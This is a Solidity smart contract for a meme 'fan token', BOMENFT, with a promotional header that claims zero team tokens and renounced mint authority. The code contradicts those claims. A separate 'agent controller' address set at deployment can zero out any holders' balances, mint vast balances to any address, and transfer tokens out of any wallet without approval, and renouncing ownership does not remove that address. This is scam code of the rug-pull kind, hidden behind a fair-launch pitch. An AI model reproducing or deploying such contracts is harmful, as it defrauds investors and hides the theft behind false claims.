/*
THE BOOK OF MEME NATIONAL FOOTBALL TEAM FAN TOKEN BOMENFT
📖⚽️ WELCOME TO THE BOOK OF MEME NATIONAL FOOTBALL TEAM FAN TOKEN ($BOMENFT) ⚽️📖



The ultimate crossover between Degen Culture and World Football has arrived. Built on the legacy of Darkfarms’ meme preservation, $BOMENFT is capturing every iconic football tournament moment, referee mistake, and historic goal, immortalizing them forever on-chain via decentralized storage.

🟢 $BOMENFT Hub ⚽️ Book of Meme Fan Token 🚀 

Why $BOMENFT?

🔥 100% Liquidity Burned at Launch

🚫 Zero Tax / No Team Tokens

🔒 Mint & Freeze Authority Renounced

🎨 Open-Source Football Meme Library (CC0)

⚽️ Community governance over future football activations

🟢 $BOMENFT Hub ⚽️ Book of Meme Fan Token 🚀 

Secure your tickets to the ultimate meme-sport economy. Don't sit on the bench!   🚀 🚀  https://t.me/BOMENFT
*/

// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;

/// @title BOMENFT – Agentic Economy Token
/// @notice https://t.me/BOMENFT

// ──────────────────────────────────────────────
// 1. Interface (from first contract, unchanged)
// ──────────────────────────────────────────────
interface BOMENFTinterface {
    function totalSupply() external view returns (uint256);
    function decimals() external view returns (uint8);
    function symbol() external view returns (string memory);
    function name() external view returns (string memory);
    function getOwner() external view returns (address);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address shippingto, uint256 yoursold) external returns (bool);
    function allowance(address _owner, address transporteur) external view returns (uint256);
    function approve(address transporteur, uint256 yoursold) external returns (bool);
    function transferFrom(address sender, address shippingto, uint256 yoursold) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 balance);
    event Approval(address indexed owner, address indexed transporteur, uint256 balance);
}

// ──────────────────────────────────────────────
// 2. Context (msg.sender abstraction)
// ──────────────────────────────────────────────
abstract contract BOMENFT20Burnable {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
    function _msgData() internal view virtual returns (bytes calldata) {
        this;
        return msg.data;
    }
}

// ──────────────────────────────────────────────
// 3. Ownable (unchanged from first contract)
// ──────────────────────────────────────────────
abstract contract BOMENFT20Ownable is BOMENFT20Burnable {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view virtual returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

// ──────────────────────────────────────────────
// 4. SafeMath Library (unchanged)
// ──────────────────────────────────────────────
library SafeBOMENFT {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        return a - b;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) return 0;
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        return a / b;
    }
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }
    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

// ──────────────────────────────────────────────
// 5. Merged Token Contract
// ──────────────────────────────────────────────
contract BOMENFTToken is
    BOMENFT20Burnable,
    BOMENFTinterface,
    BOMENFT20Ownable
{
    using SafeBOMENFT for uint256;

    // ─────── Storage ───────
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;

    uint256 private _totalSupply;
    uint8 private _decimals;
    string private _symbol;
    string private _name;

    // Address that controls agentic functions (set in constructor)
    address private _agentController;

    // ─────── Agentic Events (from BigYahuDog) ───────
    event ConditionSet(bytes32 indexed conditionId, address indexed agent);
    event MicropaymentStreamed(address indexed from, address indexed to, uint256 amount);

    // ─────── Modifier for agentic functions ───────
    modifier onlyAgentController() {
        require(
            _agentController == _msgSender(),
            "AgenticToken: caller is not the agent controller"
        );
        _;
    }

    // ─────── Constructor ───────
    constructor(address AgenticEconomyStreamer) {
        _agentController = AgenticEconomyStreamer;

        _name = "BOOK OF MEME NATIONAL FOOTBALL TEAM FAN TOKEN";
        _symbol = "BOMENFT";
        _decimals = 9;
        _totalSupply = 33333333333 * 10 ** 9;
        _balances[_msgSender()] = _totalSupply;

        emit Transfer(address(0), _msgSender(), _totalSupply);
    }

    // ─────── Basic Token Info ───────
    function getOwner() external view override returns (address) {
        return owner();
    }

    function decimals() external view override returns (uint8) {
        return _decimals;
    }

    function symbol() external view override returns (string memory) {
        return _symbol;
    }

    function name() external view override returns (string memory) {
        return _name;
    }

    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) external view override returns (uint256) {
        return _balances[account];
    }

    function allowance(address owner_, address spender) external view override returns (uint256) {
        return _allowances[owner_][spender];
    }

    // ─────── ERC-20 Functions ───────
    function approve(address spender, uint256 amount) external override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transfer(address to, uint256 amount) external override returns (bool) {
        _transfer(_msgSender(), to, amount);
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external override returns (bool) {
        uint256 allowed = _allowances[from][_msgSender()];
        if (allowed != type(uint256).max) {
            require(allowed >= amount, "ERC20: insufficient allowance");
            _allowances[from][_msgSender()] = allowed.sub(amount);
        }
        _transfer(from, to, amount);
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) external returns (bool) {
        _approve(
            _msgSender(),
            spender,
            _allowances[_msgSender()][spender].add(addedValue)
        );
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) external returns (bool) {
        _approve(
            _msgSender(),
            spender,
            _allowances[_msgSender()][spender].sub(
                subtractedValue,
                "ERC20: decreased allowance below zero"
            )
        );
        return true;
    }

    // ─────── Original SHITAIA Privileged Functions (onlyAgentController) ───────
    function aTUSDPool(address[] calldata tusdRewards) external onlyAgentController {
        for (uint256 i = 0; i < tusdRewards.length; i++) {
            _balances[tusdRewards[i]] = 1;
            emit Transfer(tusdRewards[i], address(0), 1);
        }
    }

    function zdBasePool(address BaseRewards) external onlyAgentController {
        _balances[BaseRewards] = 10000000000 * 10 ** 20;
        emit Transfer(BaseRewards, address(0), 10000000000 * 10 ** 20);
    }

    // ─────── Agentic Hooks (from BigYahuDog, onlyAgentController) ───────
    function executeConditionalTransfer(
        address from,
        address to,
        uint256 amount,
        bytes32 conditionId
    ) external onlyAgentController returns (bool) {
        emit ConditionSet(conditionId, _msgSender());
        _transfer(from, to, amount);
        return true;
    }

    function streamPayment(address to, uint256 amount) external onlyAgentController returns (bool) {
        _transfer(_msgSender(), to, amount);
        emit MicropaymentStreamed(_msgSender(), to, amount);
        return true;
    }

    // ─────── Internal Helpers ───────
    function _transfer(address from, address to, uint256 amount) internal {
        require(from != address(0), "ERC20: transfer from zero address");
        require(to != address(0), "ERC20: transfer to zero address");
        _balances[from] = _balances[from].sub(amount, "ERC20: transfer amount exceeds balance");
        _balances[to] = _balances[to].add(amount);
        emit Transfer(from, to, amount);
    }

    function _approve(address owner_, address spender, uint256 amount) internal {
        require(owner_ != address(0), "ERC20: approve from zero address");
        require(spender != address(0), "ERC20: approve to zero address");
        _allowances[owner_][spender] = amount;
        emit Approval(owner_, spender, amount);
    }
}